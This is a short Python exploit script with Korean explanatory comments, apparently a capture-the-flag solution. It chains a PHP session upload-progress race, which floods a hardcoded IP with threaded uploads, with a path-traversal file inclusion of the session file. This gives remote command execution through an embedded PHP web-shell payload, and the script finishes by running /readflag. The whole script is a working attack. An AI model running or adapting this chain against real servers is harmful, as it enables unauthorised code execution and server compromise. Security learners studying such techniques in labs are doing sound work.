#!/usr/bin/env python3

import requests
import threading
from urllib.parse import quote


# HOST = "http://localhost:8000"
HOST = "http://20.196.197.149:8000"

print ("Hello world")

def exploit():
    headers = {
        "Cookie": "PHPSESSID=eins" # 세션 ID 설정: 공격자는 요청 헤더의 Cookie 필드를 통해 특정 세션 ID를 설정합니다. 이렇게 하면 서버는 해당 ID와 연결된 세션 파일에 업로드 진행 상태를 저장합니다.
    }
    dummy = "a" * (800000-1) # 공격자는 많은 양의 데이터를 업로드하며, 이로 인해 PHP가 세션 파일을 반복적으로 업데이트합니다.
    pay = "<?=`$_GET[0]`;?>" # 사용자 입력 값을 리눅스 명령어로 인식(?)함.
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': pay # PHP 세션 업로드 진행상태를 조작하기 위해서 쉽게 말하면 session 파일(?)에 악성 코드를 쓰는 거다.
    }

    def run():
        while True:
            conn = requests.post(HOST, files={"f": dummy}, data=data, headers=headers)
            r1 = conn.text
    for i in range(10): # 쓰레드를 이용해서 한번에 여러개를 보내려고 함.
        T = threading.Thread(target=run, args=())
        T.start()
    
def execCommand(command="ls"):
    URL = HOST + "/?page=../../../../../../../var/lib/php/sessions/sess_eins&0=" + quote(command)
    resp = requests.get(URL)
    print (f"Command => {command}")
    res = resp.text.strip()
    if len(res) == 0:
        execCommand(command)
    else:
        print (f"Result => {resp.text}")
exploit()
execCommand("/readflag")